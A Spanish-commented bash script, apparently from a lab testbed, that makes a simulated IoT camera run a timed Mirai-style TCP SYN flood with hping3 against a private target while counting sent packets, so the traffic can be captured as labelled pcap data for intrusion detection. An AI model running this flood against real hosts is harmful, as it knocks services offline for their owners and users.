#!/usr/bin/env bash
# ==============================================================================
# NODO: IoT-Cam-1 (192.168.10.10)
# FASE 6.3 - ESCENARIO 3: Ataque DDoS Mirai - TCP SYN Flood Verbose (label = 1)
# Propósito: Ráfaga controlada TCP SYN Flood al puerto 80 durante 10 segundos
#            mostrando EN CALIENTE las respuestas y el contador en vivo de paquetes TX/s
# Uso: sudo bash scripts/iot-cam-1/05_escenario3_mirai_syn.sh [ip_victima=172.16.0.100] [segundos=10]
# ==============================================================================
set -euo pipefail

TARGET="${1:-172.16.0.100}"
SECONDS_DUR="${2:-10}"
SECONDS_DUR="${SECONDS_DUR%s}"
IFACE="${3:-eth0}"

echo "=================================================================="
echo "[IoT-Cam-1] ESCENARIO 3 (VERBOSE EN CALIENTE): DDoS Mirai TCP SYN Flood"
echo "Objetivo : $TARGET:80 | Duración: ${SECONDS_DUR}s | Tasa: ~1000 SYN/s (u1000)"
echo "=================================================================="
echo "[!] Asegúrate de tener corriendo en SOC-Sniffer:"
echo "    sudo bash scripts/soc-sniffer/03_capturar_escenario.sh mirai_syn"
echo "------------------------------------------------------------------"

get_tx_pkts() {
    cat "/sys/class/net/$IFACE/statistics/tx_packets" 2>/dev/null || echo 0
}

START_TX=$(get_tx_pkts)

# Monitor en caliente segundo a segundo del volumen de paquetes SYN inyectados
(
    PREV_TX=$START_TX
    for s in $(seq 1 "$SECONDS_DUR"); do
        sleep 1
        NOW_TX=$(get_tx_pkts)
        DELTA=$((NOW_TX - PREV_TX))
        TOTAL=$((NOW_TX - START_TX))
        PREV_TX=$NOW_TX
        printf "[%s] [SYN FLOOD EN VIVO - Seg %2d/%2d] Inyectando ráfaga TCP SYN -> %s:80 | +%d pkt/s | Acumulado: %d paquetes SYN\n" \
            "$(date +'%H:%M:%S')" "$s" "$SECONDS_DUR" "$TARGET" "$DELTA" "$TOTAL"
    done
) &
MON_PID=$!

# Ejecutar hping3 en modo verbose (-V) enviando señal SIGINT al cumplirse el tiempo para mostrar resumen completo
timeout --signal=INT "${SECONDS_DUR}s" hping3 -V -S -p 80 -i u1000 "$TARGET" || true

wait "$MON_PID" 2>/dev/null || true
END_TX=$(get_tx_pkts)
TOTAL_SENT=$((END_TX - START_TX))

echo ""
echo "=================================================================="
echo "[OK] Escenario 3 (Mirai SYN Flood) finalizado."
echo " -> Total de paquetes inyectados por $IFACE: $TOTAL_SENT paquetes"
echo " -> Presiona [Ctrl + C] en SOC-Sniffer para guardar 'mirai_syn.pcap'."
echo "=================================================================="
